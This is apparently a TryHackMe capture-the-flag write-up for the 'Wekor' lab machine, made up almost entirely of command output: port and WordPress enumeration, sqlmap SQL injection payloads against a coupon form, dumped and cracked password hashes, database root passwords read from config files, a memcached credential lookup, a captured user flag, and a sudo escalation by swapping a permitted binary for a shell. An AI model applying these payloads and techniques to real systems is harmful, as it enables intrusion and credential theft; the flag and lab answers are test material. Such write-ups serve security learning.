---
title: Wekor
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Wekor machine
  on TryHackMe.
slug: wekor
---




```
PORT   STATE SERVICE    VERSION
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped
|_http-title: Site doesn't have a title (text/html).
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
Aggressive OS guesses: Linux 4.15 (98%), Linux 4.15 - 5.19 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.2 - 4.14 (96%), Android 9 - 10 (Linux 4.9 - 4.14) (95%), Linux 5.4 (94%), Linux 2.6.32 - 3.5 (94%), Linux 2.6.32 - 3.13 (93%), Sony X75CH-series Android TV (Android 5.0) (92%), Linux 2.6.32 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 5900/tcp)
HOP RTT        ADDRESS
1   4829.41 ms 10.21.0.1
2   ... 3
4   4846.66 ms wekor.thm (10.201.20.40)


```

```
User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting

```

```
ffuf -H "Host: FUZZ.wekor.thm" -u http://wekor.thm -t 500 -fs 23 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
________________________________________________

site                    [Status: 200, Size: 143, Words: 27, Lines: 6, Duration: 6588ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

```
❯ gobuster dir -u http://site.wekor.thm -w /usr/share/wordlists/dirb/common.txt

/.htaccess            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 143]
/server-status        (Status: 403) [Size: 279]
/wordpress            (Status: 301) [Size: 320] [--> http://site.wekor.thm/wordpress/]
Progress: 4613 / 4613 (100.00%)

```

```
❯ wpscan --url http://site.wekor.thm/wordpress/ -e ap,u

[+] URL: http://site.wekor.thm/wordpress/ [10.201.115.148]
[+] Started: Wed Nov  5 22:31:55 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://site.wekor.thm/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://site.wekor.thm/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://site.wekor.thm/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://site.wekor.thm/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.6 identified (Insecure, released on 2020-12-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://site.wekor.thm/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.6</generator>
 |  - http://site.wekor.thm/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.6</generator>

[+] WordPress theme in use: twentytwentyone
 | Location: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-08-05T00:00:00.000Z
 | Readme: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/style.css?ver=1.0, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:02 <==================================================================> (10 / 10) 100.00% Time: 00:00:02

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://site.wekor.thm/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Nov  5 22:33:00 2025
[+] Requests Done: 54
[+] Cached Requests: 6
[+] Data Sent: 15.043 KB
[+] Data Received: 396.075 KB
[+] Memory used: 260.723 MB
[+] Elapsed time: 00:01:05


```


```
❯ sqlmap -u "http://wekor.thm/it-next/it_cart.php" -p "coupon_code" --dbs --forms --batch

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.8#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:24:17 /2025-11-06/

[03:24:17] [INFO] testing connection to the target URL
[03:24:18] [INFO] searching for forms
[03:24:19] [INFO] found a total of 3 targets
[2/3] Form:
POST http://wekor.thm/it-next/it_cart.php
POST data: coupon_code=&apply_coupon=Apply%20Coupon
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: coupon_code=&apply_coupon=Apply%20Coupon] (Warning: blank fields detected): coupon_code=&apply_coupon=Apply Coupon
do you want to fill blank fields with random values? [Y/n] Y
[03:24:19] [INFO] using '/home/kali/.local/share/sqlmap/output/results-11062025_0324am.csv' as the CSV results file in multiple targets mode
[03:24:20] [INFO] testing if the target URL content is stable
[03:24:21] [INFO] target URL content is stable
[03:24:22] [INFO] heuristic (basic) test shows that POST parameter 'coupon_code' might be injectable (possible DBMS: 'MySQL')
[03:24:23] [INFO] heuristic (XSS) test shows that POST parameter 'coupon_code' might be vulnerable to cross-site scripting (XSS) attacks
[03:24:23] [INFO] testing for SQL injection on POST parameter 'coupon_code'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[03:24:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[03:24:24] [WARNING] reflective value(s) found and filtering out
[03:24:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[03:24:35] [INFO] testing 'Generic inline queries'
[03:24:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[03:24:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[03:25:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[03:25:18] [INFO] POST parameter 'coupon_code' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' injectable (with --string="Coupon Code Does Not Exist!")
[03:25:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[03:25:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[03:25:19] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[03:25:20] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[03:25:20] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[03:25:20] [INFO] POST parameter 'coupon_code' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[03:25:20] [INFO] testing 'MySQL inline queries'
[03:25:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[03:25:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[03:25:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[03:25:22] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[03:25:22] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[03:25:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[03:25:24] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[03:25:35] [INFO] POST parameter 'coupon_code' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[03:25:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[03:25:35] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[03:25:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[03:25:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[03:25:40] [INFO] target URL appears to have 3 columns in query
[03:25:41] [INFO] POST parameter 'coupon_code' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[03:25:41] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'coupon_code' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 125 HTTP(s) requests:
---
Parameter: coupon_code (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: coupon_code=ifTS' OR NOT 8638=8638#&apply_coupon=Apply Coupon

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: coupon_code=ifTS' AND GTID_SUBSET(CONCAT(0x7176627671,(SELECT (ELT(7303=7303,1))),0x7176706271),7303)-- pYqe&apply_coupon=Apply Coupon

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: coupon_code=ifTS' AND (SELECT 3266 FROM (SELECT(SLEEP(5)))HmUv)-- ahJe&apply_coupon=Apply Coupon

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: coupon_code=ifTS' UNION ALL SELECT NULL,CONCAT(0x7176627671,0x4177714c68515a4b4d69627069766959626f48794f514d72444158726b4d51457564477177504466,0x7176706271),NULL#&apply_coupon=Apply Coupon
---
do you want to exploit this SQL injection? [Y/n] Y
[03:25:41] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.04 or 16.10 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[03:25:49] [INFO] fetching database names
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress

[03:25:50] [INFO] skipping 'http://wekor.thm/it-next/it_cart.php?s='
[03:25:50] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-11062025_0324am.csv'                                                                                                                             

[*] ending @ 03:25:50 /2025-11-06/

```



```
❯ sqlmap -u "http://wekor.thm/it-next/it_cart.php" \
  --data="coupon_code=&apply_coupon=Apply+Coupon" \
  -p "coupon_code" \
  -D wordpress -T wp_users \
  --dump --batch --forms

        ___
       __H__
 ___ ___["]_____ ___ ___  {1.9.8#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 03:39:35 /2025-11-06/

[03:39:35] [INFO] testing connection to the target URL
[03:39:36] [INFO] searching for forms
[03:39:38] [INFO] found a total of 3 targets
[1/3] Form:
POST http://wekor.thm/it-next/it_cart.php
POST data: coupon_code=&apply_coupon=Apply%20Coupon
do you want to test this form? [Y/n/q] 
> Y
Edit POST data [default: coupon_code=&apply_coupon=Apply%20Coupon] (Warning: blank fields detected): coupon_code=&apply_coupon=Apply Coupon
do you want to fill blank fields with random values? [Y/n] Y
[03:39:38] [INFO] resuming back-end DBMS 'mysql' 
[03:39:38] [INFO] using '/home/kali/.local/share/sqlmap/output/results-11062025_0339am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: coupon_code (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: coupon_code=ifTS' OR NOT 8638=8638#&apply_coupon=Apply Coupon

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: coupon_code=ifTS' AND GTID_SUBSET(CONCAT(0x7176627671,(SELECT (ELT(7303=7303,1))),0x7176706271),7303)-- pYqe&apply_coupon=Apply Coupon

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: coupon_code=ifTS' AND (SELECT 3266 FROM (SELECT(SLEEP(5)))HmUv)-- ahJe&apply_coupon=Apply Coupon

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: coupon_code=ifTS' UNION ALL SELECT NULL,CONCAT(0x7176627671,0x4177714c68515a4b4d69627069766959626f48794f514d72444158726b4d51457564477177504466,0x7176706271),NULL#&apply_coupon=Apply Coupon
---
do you want to exploit this SQL injection? [Y/n] Y
[03:39:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[03:39:45] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
[03:39:46] [INFO] fetching entries for table 'wp_users' in database 'wordpress'
[03:39:47] [INFO] recognized possible password hashes in column 'user_pass'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [y/N/q] N
Database: wordpress
Table: wp_users
[4 entries]
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| ID   | user_url                        | user_pass                          | user_email        | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
+------+---------------------------------+------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| 1    | http://site.wekor.thm/wordpress | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B. | admin@wekor.thm   | admin      | 0           | admin        | admin         | 2021-01-21 20:33:37 | <blank>                                       |
| 5743 | http://jeffrey.com              | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10 | jeffrey@wekor.thm | wp_jeffrey | 0           | wp jeffrey   | wp_jeffrey    | 2021-01-21 20:34:50 | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 |
| 5773 | http://yura.com                 | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/ | yura@wekor.thm    | wp_yura    | 0           | wp yura      | wp_yura       | 2021-01-21 20:35:27 | <blank>                                       |
| 5873 | http://eagle.com                | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ | eagle@wekor.thm   | wp_eagle   | 0           | wp eagle     | wp_eagle      | 2021-01-21 20:36:11 | <blank>                                       |
               

[*] ending @ 03:39:47 /2025-11-06/


```

```
❯ hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10


$P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10:rockyou                
$P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/:xxxxxx                 
$P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/:soccer13               
Cracking performance lower than expected?                 



```

```
www-data@osboxes:/$ cat /var/www/html/it-next/config.php
<?php

define("DB_SERVER","localhost");

define("DB_USERNAME" , "root");

define("DB_PASSWORD", "root123@#59");

define("DB_DATABASE", "coupons");

$db = new mysqli(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
$db->set_charset("utf8");

?>

```

```
www-data@osboxes:/$ cat /var/www/html/site.wekor.thm/wordpress/wp-config.php
<?php
/**

 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'root' );

/** MySQL database password */
define( 'DB_PASSWORD', 'root123@#59' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+

```

```
www-data@osboxes:/$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
Orka:x:1001:1001::/home/Orka:/bin/bash
sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
memcache:x:123:130:Memcached,,,:/nonexistent:/bin/false


```

```
www-data@osboxes:/$ ps -aux | grep "memca"
memcache   955  0.0  0.3  47724  1588 ?        Ssl  22:09   0:00 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
www-data  2127  0.0  0.1   3036   884 pts/9    S+   23:58   0:00 grep memca

```

```
www-data@osboxes:/$ telnet localhost 11211
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.

```

```
get email
VALUE email 0 14
Orka@wekor.thm
END
get username
VALUE username 0 4
Orka
END
get password
VALUE password 0 15
...........

```

> I have sudo pwd

```
www-data@osboxes:/home$ su Orka
Password: 
Orka@osboxes:/home$ ls
lost+found  Orka
Orka@osboxes:/home$ cd Orka
Orka@osboxes:~$ ls
Desktop    Downloads  Pictures  Templates  Videos
Documents  Music      Public    user.txt
Orka@osboxes:~$ cat user.txt
1a26a6d51c0172400add0e297608dec6
Orka@osboxes:~$

```

```
[sudo] password for Orka:
Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin


Orka@osboxes:~$ ls -la Desktop/bitcoin
-rwxr-xr-x 1 root root 7696 Jan 23 15:23 Desktop/bitcoin

```

```
Orka@osboxes:~$ mv Desktop a
Orka@osboxes:~$ ls -la
total 116
drwxr-xr-- 18 Orka Orka 4096 Nov  7 02:09 .
drwxr-xr-x  4 root root 4096 Jul 12  2020 ..
drwxrwxr-x  2 root root 4096 Jan 23  2021 a
Orka@osboxes:~$ cp /bin/sh ./Desktop/bitcoin
Orka@osboxes:~$ pwd
/home/Orka
Orka@osboxes:~$ sudo /home/Orka/Desktop/bitcoin
[sudo] password for Orka: 

/home/Orka
# ls
a        Documents  Music     Public     user.txt
Desktop  Downloads  Pictures  Templates  Videos
# cd /root
# ls
cache.php  root.txt  server.py  wordpress_admin.txt
# cat root.txt


```